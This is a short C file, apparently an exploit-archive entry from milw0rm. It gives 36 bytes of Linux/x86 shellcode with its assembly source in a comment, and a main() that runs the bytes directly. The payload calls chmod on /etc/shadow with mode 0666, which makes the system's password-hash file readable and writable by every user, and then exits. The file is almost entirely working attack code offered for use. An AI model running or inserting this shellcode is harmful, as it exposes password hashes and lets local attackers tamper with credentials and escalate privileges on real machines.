/* By Kris Katterjohn 8/29/2006
 *
 * 36 byte shellcode to chmod("/etc/shadow", 0666) and exit for Linux/x86
 *
 * To remove exit(): Remove the last 5 bytes (0x6a - 0x80)
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *      xor edx, edx
 *
 *      push byte 15
 *      pop eax
 *      push edx
 *      push byte 0x77
 *      push word 0x6f64
 *      push 0x6168732f
 *      push 0x6374652f
 *      mov ebx, esp
 *      push word 0666Q
 *      pop ecx
 *      int 0x80
 *
 *      push byte 1
 *      pop eax
 *      int 0x80
 */

main()
{
       char shellcode[] =
               "\x31\xd2\x6a\x0f\x58\x52\x6a\x77\x66\x68\x64\x6f\x68"
               "\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\x68"
               "\xb6\x01\x59\xcd\x80\x6a\x01\x58\xcd\x80";

       (*(void (*)()) shellcode)();
}

// milw0rm.com [2006-11-17]